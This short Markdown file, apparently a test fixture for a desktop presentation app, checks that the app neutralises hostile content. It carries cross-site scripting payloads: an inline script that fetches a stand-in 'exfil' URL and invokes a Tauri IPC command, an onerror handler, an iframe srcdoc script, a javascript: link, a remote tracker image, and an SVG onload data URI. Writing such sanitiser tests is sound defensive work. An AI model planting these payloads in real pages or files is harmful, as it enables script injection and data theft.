# Hostile deck

Safe preview text remains visible.

<script>window.__elefHostileScriptRan = true; window.parent.postMessage("hostile", "*"); void fetch("https://example.invalid/exfil").catch(() => {}); window.__TAURI__?.core?.invoke?.("create_deck", { name: "Hostile IPC side effect", kind: "presentation" })</script>

<img src="x" onerror="window.__elefHostileEventRan = true">
<iframe src="https://example.invalid/frame" srcdoc="<script>parent.__elefHostileFrameRan = true</script>"></iframe>

[unsafe link](javascript:window.__elefHostileLinkRan=true)

![remote image](https://example.invalid/tracker.png)
![data image](data:image/svg+xml,%3Csvg%20onload%3Dalert(1)%3E)
